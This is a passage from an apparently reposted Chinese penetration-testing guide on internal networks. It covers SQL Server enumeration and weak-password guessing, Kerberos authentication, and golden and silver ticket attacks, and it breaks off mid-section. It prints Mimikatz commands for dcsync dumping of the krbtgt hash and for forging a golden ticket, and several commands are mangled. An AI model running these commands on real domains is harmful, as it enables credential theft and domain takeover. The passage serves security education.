[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server3.mydomain.com,<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1433</span> (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.103</span>) - Sysadmin: No - SvcIsDA: No 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server3.mydomain.comSQLEXPRESS (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.103</span>) - Sysadmin: No - SvcIsDA: No
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">+</span>] SUCCESS! - server4.mydomain.comAppData (<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">192.168.1.104</span>) - Sysadmin: Yes - SvcIsDA: Yes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ----------------------------------------------------------------------
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">3</span> of <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">5</span> SQL Server instances could be accessed. &nbsp; &nbsp; &nbsp; &nbsp;
[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] End Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">04</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">01</span>/<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2014</span> <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">10</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">02</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span> &nbsp; &nbsp; &nbsp;[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] Total Time: <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">02</span>:<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">00</span>[<span class="hljs-meta" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 153);font-weight: bold;">*</span>] ----------------------------------------------------------------------</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">弱口令猜解</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">#</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">寻找敏感数据</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Get-SQLServerAccess -query "<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">select</span> <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">name</span> <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">as</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'Databases'</span> <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">from</span> master..sysdatabases <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">where</span> HAS_DBACCESS(<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">name</span>) = <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span><span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">更多参考：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">非扫描式的SQL Server发现</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">相关资料：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">SPN扫描</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1508</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">扫描SQLServer的脚本</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/PyroTek3/PowerShell-AD-Recon</span></p><h3 name="h3-5" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Kerberos的黄金门票</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1640</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">域服务账号破解实践</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://bobao.360.cn/learning/detail/3564.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Kerberos的认证原理</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://blog.csdn.net/wulantian/article/details/42418231</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">深刻理解windows安全认证机制ntlm＆Kerberos</span></p><h4 style="margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 1.2;color: rgba(0, 0, 0, 0.85);font-size: 1.5rem;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">的Kerberos身份验证流程</span></h4><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.7423245614035088" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/13_rwYbEhpib9aQXC2H9aFEQUibc9rppQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVsXVKVTym0G8jS3jDUVKcAiaGKAmrwYbEhpib9aQXC2H9aFEQUibc9rppQ/640?wx_fmt=png'" data-type="png" data-w="912" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><ul style="" class=" list-paddingleft-2"><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">密码转换为NTLM哈希值，时间戳使用散列加密，并作为身份验证票据（TGT）请求（AS-REQ）中的身份验证器发送给KDC。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">域控制器（KDC）检查用户信息（登录限制，组成员身份等）并创建票证授予票证（TGT）。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">TGT被加密，签名并交付给用户（AS-REP）。只有域中的Kerberos的服务（KRBTGT）才能打开并读取TGT数据。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">用户在申请票证授予服务（TGS）票证（TGS-REQ）时向TG提交TGT.DC打开TGT并验证PAC校验和 - 如果DC可以打开票证和校验和签出，则TGT =有效.TGT中的数据被有效地复制来创建TGS票据。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用目标服务帐户的NTLM密码散列对TGS进行加密并发送给用户（TGS-REP）。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">用户在适当的端口上连接到托管服务的服务器并呈现TGS（AP-REQ）。该服务使用其NTLM密码散列打开TGS票证。</span></p></li></ul><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">其实可以说是一种后门而不是什么漏洞。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">黄金票据是伪造TGT，可以获取任何Kerberos的服务权限，与域控制器没有AS-REQ或AS-REP（步骤1和2）通信。由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;vertical-align: inherit;">Kerberos黄金票证是有效的TGT Kerberos票证，因为它是由域Kerberos帐户（KRBTGT）加密/签名的.TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证.TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的事实证明它是有效的<br  /></span><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.49874686716791977" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/14_VkWJs6VIibqTibCFHmSI2oXQOE8YaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVvj0DVekXj9jibl0gCFFE8iaQGgrvVkWJs6VIibqTibCFHmSI2oXQOE8YaA/640?wx_fmt=png'" data-type="png" data-w="1197" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">利用条件：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">1.普通域用户</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">2.krbtgt ntlm哈希</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">3.域SID</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">在域上抓取的哈希</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">lsadump::dcsync /domain:pentest.com /user:krbtgt</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.637065637065637" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/15_Pb05icrE0IqCq0CIdSF0ibUzhPWWzA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV9e6MEjbNfiaNugLD3bia3KFCoaicSPb05icrE0IqCq0CIdSF0ibUzhPWWzA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1036" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">kerberos::<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">purge</span>kerberos::golden /<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">admin</span>:administrator /<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">domain</span>:域 /<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">sid</span>:<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SID</span> /krbtgt:<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">hash</span>值 /ticket:adinistrator.kiribi
kerberos::ptt administrator.kiribi
kerberos::tgt
net <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">use</span> k: \pentest.comc$</span></code></pre><h3 name="h3-6" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Kerberos的银票务</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">攻击者如何使用Kerberos的银票来利用系统</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=2011</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://www.feiworks.com/wy/drops/域渗透--pass％第二十条％20Ticket.pdf</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">黄金票据和白银票据的一些区别：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino 